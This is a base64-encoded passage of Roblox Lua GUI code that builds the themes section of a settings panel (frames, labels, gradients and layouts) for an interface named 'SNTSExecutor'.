I1NSk7CkcyTFsiODUiXVsiU2Nyb2xsQmFySW1hZ2VUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiODUiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDMwMSwgMCwgMzQ1KTsKRzJMWyI4NSJdWyJTY3JvbGxCYXJJbWFnZUNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjQxLCAyNDEsIDI0MSk7CkcyTFsiODUiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjA5MTg5LCAwLCAwLjE3MzgyLCAwKTsKRzJMWyI4NSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjg1Il1bIlNjcm9sbEJhclRoaWNrbmVzcyJdID0gNTsKRzJMWyI4NSJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTEKRzJMWyI4NiJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiODUiXSk7CkcyTFsiODYiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjg2Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpOwpHMkxbIjg2Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyOTAsIDAsIDcwKTsKRzJMWyI4NiJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjg2Il1bIk5hbWUiXSA9IFtbVGhlbWUxXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMS5VSUNvcm5lcgpHMkxbIjg3Il0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyI4NiJdKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMS5UaGVtZU5hbWUKRzJMWyI4OCJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjg2Il0pOwpHMkxbIjg4Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI4OCJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiODgiXVsiVGV4dFhBbGlnbm1lbnQiXSA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKRzJMWyI4OCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI4OCJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjg4Il1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjg4Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiODgiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAsIDAuNSk7CkcyTFsiODgiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDE4NSwgMCwgNTApOwpHMkxbIjg4Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiODgiXVsiVGV4dCJdID0gW1tTb3JiZXRdXTsKRzJMWyI4OCJdWyJOYW1lIl0gPSBbW1RoZW1lTmFtZV1dOwpHMkxbIjg4Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wNDY3OCwgMCwgMC41LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUxLlRoZW1lMQpHMkxbIjg5Il0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyI4NiJdKTsKRzJMWyI4OSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiODkiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNyk7CkcyTFsiODkiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDEzNCwgMCwgNTApOwpHMkxbIjg5Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC40OTMxLCAwLCAwLjIwMDkxLCAwKTsKRzJMWyI4OSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjg5Il1bIk5hbWUiXSA9IFtbVGhlbWUxXV07CkcyTFsiODkiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUxLlRoZW1lMS5HcmFkaWVudDEKRzJMWyI4YSJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiODkiXSk7CkcyTFsiOGEiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjhhIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjhhIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygxLCAwLjUpOwpHMkxbIjhhIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzNSwgMCwgMzUpOwpHMkxbIjhhIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4yOTQ3OCwgMCwgMC4zNCwgMCk7CkcyTFsiOGEiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI4YSJdWyJOYW1lIl0gPSBbW0dyYWRpZW50MV1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTEuVGhlbWUxLkdyYWRpZW50MS5VSUNvcm5lcgpHMkxbIjhiIl0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyI4YSJdKTsKRzJMWyI4YiJdWyJDb3JuZXJSYWRpdXMiXSA9IFVEaW0ubmV3KDAsIDEwMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMS5UaGVtZTEuR3JhZGllbnQxLlVJU3Ryb2tlCkcyTFsiOGMiXSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBHMkxbIjhhIl0pOwpHMkxbIjhjIl1bIlRoaWNrbmVzcyJdID0gMjsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUxLlRoZW1lMS5HcmFkaWVudDIKRzJMWyI4ZCJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiODkiXSk7CkcyTFsiOGQiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjhkIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjhkIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygxLCAwLjUpOwpHMkxbIjhkIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzNSwgMCwgMzUpOwpHMkxbIjhkIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC42MzA2LCAwLCAwLjM0LCAwKTsKRzJMWyI4ZCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjhkIl1bIk5hbWUiXSA9IFtbR3JhZGllbnQyXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMS5UaGVtZTEuR3JhZGllbnQyLlVJQ29ybmVyCkcyTFsiOGUiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjhkIl0pOwpHMkxbIjhlIl1bIkNvcm5lclJhZGl1cyJdID0gVURpbS5uZXcoMCwgMTAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUxLlRoZW1lMS5HcmFkaWVudDIuVUlTdHJva2UKRzJMWyI4ZiJdID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIEcyTFsiOGQiXSk7CkcyTFsiOGYiXVsiVGhpY2tuZXNzIl0gPSAyOwpHMkxbIjhmIl1bIkNvbG9yIl0gPSBDb2xvcjMuZnJvbVJHQigyMDEsIDIwMSwgMjAxKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUxLlRoZW1lMS5HcmFkaWVudDMKRzJMWyI5MCJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiODkiXSk7CkcyTFsiOTAiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjkwIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjkwIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygxLCAwLjUpOwpHMkxbIjkwIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzNSwgMCwgMzUpOwpHMkxbIjkwIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC45NjY0MiwgMCwgMC4zNCwgMCk7CkcyTFsiOTAiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI5MCJdWyJOYW1lIl0gPSBbW0dyYWRpZW50M11dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTEuVGhlbWUxLkdyYWRpZW50My5VSUNvcm5lcgpHMkxbIjkxIl0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyI5MCJdKTsKRzJMWyI5MSJdWyJDb3JuZXJSYWRpdXMiXSA9IFVEaW0ubmV3KDAsIDEwMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMS5UaGVtZTEuR3JhZGllbnQzLlVJU3Ryb2tlCkcyTFsiOTIiXSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBHMkxbIjkwIl0pOwpHMkxbIjkyIl1bIlRoaWNrbmVzcyJdID0gMjsKRzJMWyI5MiJdWyJDb2xvciJdID0gQ29sb3IzLmZyb21SR0IoMjAxLCAyMDEsIDIwMSk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMS5UaGVtZTEuR3JhZGllbnQzLlVJR3JhZGllbnQKRzJMWyI5MyJdID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IiwgRzJMWyI5MCJdKTsKRzJMWyI5MyJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoMTUzLCA3MiwgMTk2KSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjQ3MSwgQ29sb3IzLmZyb21SR0IoMTM2LCA3MSwgMjIwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoOTEsIDc5LCAyMDMpKX07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMS5UaGVtZTEuVUlHcmlkTGF5b3V0CkcyTFsiOTQiXSA9IEluc3RhbmNlLm5ldygiVUlHcmlkTGF5b3V0IiwgRzJMWyI4OSJdKTsKRzJMWyI5NCJdWyJIb3Jpem9udGFsQWxpZ25tZW50Il0gPSBFbnVtLkhvcml6b250YWxBbGlnbm1lbnQuQ2VudGVyOwpHMkxbIjk0Il1bIkNlbGxTaXplIl0gPSBVRGltMi5uZXcoMCwgMzUsIDAsIDM1KTsKRzJMWyI5NCJdWyJWZXJ0aWNhbEFsaWdubWVudCJdID0gRW51bS5WZXJ0aWNhbEFsaWdubWVudC5DZW50ZXI7CkcyTFsiOTQiXVsiU29ydE9yZGVyIl0gPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcjsKRzJMWyI5NCJdWyJDZWxsUGFkZGluZyJdID0gVURpbTIubmV3KDAsIDEwLCAwLCAwKTsKRzJMWyI5NCJdWyJGaWxsRGlyZWN0aW9uIl0gPSBFbnVtLkZpbGxEaXJlY3Rpb24uVmVydGljYWw7CgoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5VSUxpc3RMYXlvdXQKRzJMWyI5NSJdID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiLCBHMkxbIjg1Il0pOwpHMkxbIjk1Il1bIkhvcml6b250YWxBbGlnbm1lbnQiXSA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXI7CkcyTFsiOTUiXVsiUGFkZGluZyJdID0gVURpbS5uZXcoMCwgMTUpOwpHMkxbIjk1Il1bIlNvcnRPcmRlciJdID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXI7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMgpHMkxbIjk2Il0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyI4NSJdKTsKRzJMWyI5NiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiOTYiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNyk7CkcyTFsiOTYiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDI5MCwgMCwgNzApOwpHMkxbIjk2Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiOTYiXVsiTmFtZSJdID0gW1tUaGVtZTJdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUyLlVJQ29ybmVyCkcyTFsiOTciXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjk2Il0pOwoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUyLlRoZW1lTmFtZQpHMkxbIjk4Il0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiOTYiXSk7CkcyTFsiOTgiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjk4Il1bIlRleHRTaXplIl0gPSAxNzsKRzJMWyI5OCJdWyJUZXh0WEFsaWdubWVudCJdID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwpHMkxbIjk4Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjk4Il1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiOTgiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiOTgiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyI5OCJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyI5OCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTg1LCAwLCA1MCk7CkcyTFsiOTgiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI5OCJdWyJUZXh0Il0gPSBbW0RhcmsgdGhlbWVdXTsKRzJMWyI5OCJdWyJOYW1lIl0gPSBbW1RoZW1lTmFtZV1dOwpHMkxbIjk4Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wNDY3OCwgMCwgMC41LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUyLlRoZW1lMgpHMkxbIjk5Il0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyI5NiJdKTsKRzJMWyI5OSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiOTkiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNyk7CkcyTFsiOTkiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDEzNCwgMCwgNTApOwpHMkxbIjk5Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC40OTMxLCAwLCAwLjIwMDkxLCAwKTsKRzJMWyI5OSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjk5Il1bIk5hbWUiXSA9IFtbVGhlbWUyXV07CkcyTFsiOTkiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUyLlRoZW1lMi5HcmFkaWVudDEKRzJMWyI5YSJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiOTkiXSk7CkcyTFsiOWEiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjlhIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjlhIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygxLCAwLjUpOwpHMkxbIjlhIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzNSwgMCwgMzUpOwpHMkxbIjlhIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4yOTQ3OCwgMCwgMC4zNCwgMCk7CkcyTFsiOWEiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI5YSJdWyJOYW1lIl0gPSBbW0dyYWRpZW50MV1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTIuVGhlbWUyLkdyYWRpZW50MS5VSUNvcm5lcgpHMkxbIjliIl0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyI5YSJdKTsKRzJMWyI5YiJdWyJDb3JuZXJSYWRpdXMiXSA9IFVEaW0ubmV3KDAsIDEwMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMi5UaGVtZTIuR3JhZGllbnQxLlVJU3Ryb2tlCkcyTFsiOWMiXSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBHMkxbIjlhIl0pOwpHMkxbIjljIl1bIlRoaWNrbmVzcyJdID0gMjsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUyLlRoZW1lMi5HcmFkaWVudDIKRzJMWyI5ZCJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiOTkiXSk7CkcyTFsiOWQiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjlkIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjlkIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygxLCAwLjUpOwpHMkxbIjlkIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzNSwgMCwgMzUpOwpHMkxbIjlkIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC42MzA2LCAwLCAwLjM0LCAwKTsKRzJMWyI5ZCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjlkIl1bIk5hbWUiXSA9IFtbR3JhZGllbnQyXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMi5UaGVtZTIuR3JhZGllbnQyLlVJQ29ybmVyCkcyTFsiOWUiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjlkIl0pOwpHMkxbIjllIl1bIkNvcm5lclJhZGl1cyJdID0gVURpbS5uZXcoMCwgMTAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUyLlRoZW1lMi5HcmFkaWVudDIuVUlTdHJva2UKRzJMWyI5ZiJdID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIEcyTFsiOWQiXSk7CkcyTFsiOWYiXVsiVGhpY2tuZXNzIl0gPSAyOwpHMkxbIjlmIl1bIkNvbG9yIl0gPSBDb2xvcjMuZnJvbVJHQigyMDEsIDIwMSwgMjAxKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUyLlRoZW1lMi5HcmFkaWVudDMKRzJMWyJhMCJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiOTkiXSk7CkcyTFsiYTAiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImEwIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImEwIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygxLCAwLjUpOwpHMkxbImEwIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzNSwgMCwgMzUpOwpHMkxbImEwIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC45NjY0MiwgMCwgMC4zNCwgMCk7CkcyTFsiYTAiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJhMCJdWyJOYW1lIl0gPSBbW0dyYWRpZW50M11dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTIuVGhlbWUyLkdyYWRpZW50My5VSUNvcm5lcgpHMkxbImExIl0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyJhMCJdKTsKRzJMWyJhMSJdWyJDb3JuZXJSYWRpdXMiXSA9IFVEaW0ubmV3KDAsIDEwMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMi5UaGVtZTIuR3JhZGllbnQzLlVJU3Ryb2tlCkcyTFsiYTIiXSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBHMkxbImEwIl0pOwpHMkxbImEyIl1bIlRoaWNrbmVzcyJdID0gMjsKRzJMWyJhMiJdWyJDb2xvciJdID0gQ29sb3IzLmZyb21SR0IoMjAxLCAyMDEsIDIwMSk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMi5UaGVtZTIuR3JhZGllbnQzLlVJR3JhZGllbnQKRzJMWyJhMyJdID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IiwgRzJMWyJhMCJdKTsKRzJMWyJhMyJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoMTUzLCA3MiwgMTk2KSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjQ3MSwgQ29sb3IzLmZyb21SR0IoMTM2LCA3MSwgMjIwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoOTEsIDc5LCAyMDMpKX07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMi5UaGVtZTIuVUlHcmlkTGF5b3V0CkcyTFsiYTQiXSA9IEluc3RhbmNlLm5ldygiVUlHcmlkTGF5b3V0IiwgRzJMWyI5OSJdKTsKRzJMWyJhNCJdWyJIb3Jpem9udGFsQWxpZ25tZW50Il0gPSBFbnVtLkhvcml6b250YWxBbGlnbm1lbnQuQ2VudGVyOwpHMkxbImE0Il1bIkNlbGxTaXplIl0gPSBVRGltMi5uZXcoMCwgMzUsIDAsIDM1KTsKRzJMWyJhNCJdWyJWZXJ0aWNhbEFsaWdubWVudCJdID0gRW51bS5WZXJ0aWNhbEFsaWdubWVudC5DZW50ZXI7CkcyTFsiYTQiXVsiU29ydE9yZGVyIl0gPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcjsKRzJMWyJhNCJdWyJDZWxsUGFkZGluZyJdID0gVURpbTIubmV3KDAsIDEwLCAwLCAwKTsKRzJMWyJhNCJdWyJGaWxsRGlyZWN0aW9uIl0gPSBFbnVtLkZpbGxEaXJlY3Rpb24uVmVydGljYWw7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMwpHMkxbImE1Il0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyI4NSJdKTsKRzJMWyJhNSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiYTUiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNyk7CkcyTFsiYTUiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDI5MCwgMCwgNzApOwpHMkxbImE1Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiYTUiXVsiTmFtZSJdID0gW1tUaGVtZTNdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUzLlVJQ29ybmVyCkcyTFsiYTYiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbImE1Il0pOwoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUzLlRoZW1lTmFtZQpHMkxbImE3Il0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiYTUiXSk7CkcyTFsiYTciXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImE3Il1bIlRleHRTaXplIl0g